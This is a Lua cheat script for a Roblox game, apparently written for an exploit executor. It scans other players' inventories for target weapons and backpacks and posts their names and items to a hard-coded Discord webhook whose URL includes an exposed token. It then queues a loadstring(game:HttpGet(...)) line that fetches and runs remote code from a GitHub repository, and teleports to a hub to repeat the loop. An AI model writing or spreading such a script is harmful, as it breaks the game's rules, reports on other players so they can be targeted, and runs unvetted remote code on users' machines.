-- === SCANNER MELHORADO - MENSAGENS BONITAS ===
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1514031008654295040/efj6sTrpu2HRERFEALNMWpgsCAT0b_7V_S4oFrwclE9rkcfQ8si3EfSpaZ3rNTTnAzVq"
local HUB_PLACE_ID = 15327728308

local ITENS_ALVO = {"barret50", "renellim4", "m79", "backpacktier4", "fists"}

local function sendToDiscord(msg)
    local req = syn and syn.request or http_request or request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({content = msg})
            })
        end)
    end
end

sendToDiscord("📡 **SCANNER INICIADO** | Servidor: `" .. game.PlaceId .. "`")
task.wait(3)

local found = {}
local totalItens = 0

for _, player in ipairs(Players:GetPlayers()) do
    if player == Players.LocalPlayer then continue end

    -- Gun Inventory
    local inv = player:FindFirstChild("GunInventory")
    if inv then
        for _, obj in ipairs(inv:GetChildren()) do
            if obj:IsA("ObjectValue") and obj.Value then
                local nome = obj.Value.Name
                for _, alvo in ipairs(ITENS_ALVO) do
                    if nome and nome:lower():find(alvo:lower()) then
                        local mag = obj:FindFirstChild("BulletsInMagazine") and obj.BulletsInMagazine.Value or 0
                        table.insert(found, "**" .. player.Name .. "** | `" .. nome .. "` | " .. mag .. " balas")
                        totalItens += 1
                    end
                end
            end
        end
    end

    -- Backpack T4
    local bp = player:GetAttribute("EquipmentBackpack")
    if bp and tostring(bp):lower():find("backpacktier4") then
        table.insert(found, "**" .. player.Name .. "** | `BackpackTier4`")
        totalItens += 1
    end
end

-- Resumo bonito
if totalItens > 0 then
    sendToDiscord("⚠️ **ITENS ENCONTRADOS** (" .. totalItens .. ")\n" .. table.concat(found, "\n"))
else
    sendToDiscord("✅ **Nenhum item alvo encontrado** neste servidor.")
end

sendToDiscord("🔄 **Voltando para o Hub...**")

-- Fecha o loop
local qt = queue_on_teleport or queueteleport or (syn and syn.queue_on_teleport)
if qt then
    qt('loadstring(game:HttpGet("https://raw.githubusercontent.com/cajiwghdtyasdnhatfy/Acaswartqaawr/refs/heads/main/Hub"))()')
end

task.wait(4)
TeleportService:Teleport(HUB_PLACE_ID)
